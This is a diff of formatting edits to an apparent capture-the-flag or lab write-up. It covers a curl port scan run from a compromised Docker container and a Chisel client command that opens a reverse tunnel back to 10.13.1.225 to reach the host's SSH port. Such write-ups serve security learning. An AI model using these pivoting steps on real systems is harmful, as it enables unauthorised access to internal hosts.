@@ -60,11 +60,12 @@ I noticed a connection between `172.18.0.3` and `10.13.1.225`. Since the latter 
 curl -m 1 --include -v localhost:$x
 ```
 
-- `-m 1` Setting a max timeout time for the curl attempt, prevents me from getting stuck on an unresponsive port, which would require me to `ctrl+c` and thusly break my non-pty shell.
+> `-m 1` Setting a max timeout time for the curl attempt, prevents me from getting stuck on an unresponsive port, which would require me to `ctrl+c` and thusly break my non-pty shell.
 
 After identifying an open port 22 on the host machine, I download [Chisel](https://github.com/jpillora/chisel) onto the docker container and launch the client command: 
 
-```bash$ ./chisel client 10.13.1.225:1234 R:2002:172.168.0.1:22
+```bash
+$ ./chisel client 10.13.1.225:1234 R:2002:172.168.0.1:22
 2021/09/13 21:34:59 client: Connecting to ws://10.13.1.225:1234
 2021/09/13 21:35:00 client: Connected (Latency 184.290108ms)
 ```
